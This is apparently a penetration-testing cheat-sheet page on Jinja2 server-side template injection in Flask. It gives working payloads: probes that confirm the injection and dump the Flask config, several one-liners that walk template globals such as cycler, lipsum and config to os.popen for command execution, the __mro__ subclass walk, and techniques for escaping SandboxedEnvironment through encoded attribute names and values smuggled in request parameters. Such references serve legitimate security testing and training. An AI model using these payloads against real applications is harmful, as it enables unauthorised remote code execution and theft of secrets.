---
title: "Jinja2 server-side template injection"
description: "Exploiting Jinja2 SSTI in Flask: confirming with {{7*7}}, walking exposed globals to os for RCE, and escaping the sandboxed environment."
keywords:
  - Jinja2 SSTI
  - Flask
  - cycler globals
  - sandbox escape
  - __class__ __mro__
---

# Jinja2

Jinja2 backs Flask, where `render_template_string(user_input)` (or a template built by concatenation) is the usual sink. Confirm with `{{7*7}}` returning `49`, and `{{config}}` to dump the Flask config object.

Flask's default environment is **not** sandboxed, so exploitation walks from a globally available object to the `os` module and runs a command. Jinja2 exposes the globals `cycler`, `joiner`, `lipsum`, `range`, and `config`, each of which carries a `__globals__` reaching the interpreter:

```jinja
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

The classic longer form walks the class hierarchy to find a subclass that spawns processes, used when the short globals are unavailable:

```jinja
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

then index the resulting list to `subprocess.Popen` and call it. The globals forms above are shorter and more reliable on current Flask.

When the application uses Jinja2's `SandboxedEnvironment`, attributes beginning with `_` are blocked. Escape it by reaching those attributes without writing the underscores literally: the `|attr()` filter with an encoded name (`|attr('\x5f\x5fclass\x5f\x5f')`), `request.args` to smuggle the string from a parameter, or `.__getitem__`-style access through allowed objects. The presence of the sandbox is the difference between a one-liner and a bypass, so test a plain `{{ ''.__class__ }}` first: if it is rejected, the sandbox is on.

## Tools

- tplmap, SSTImap

## References

- Jinja2 documentation: sandbox, template globals
- PortSwigger Web Security Academy: Server-side template injection
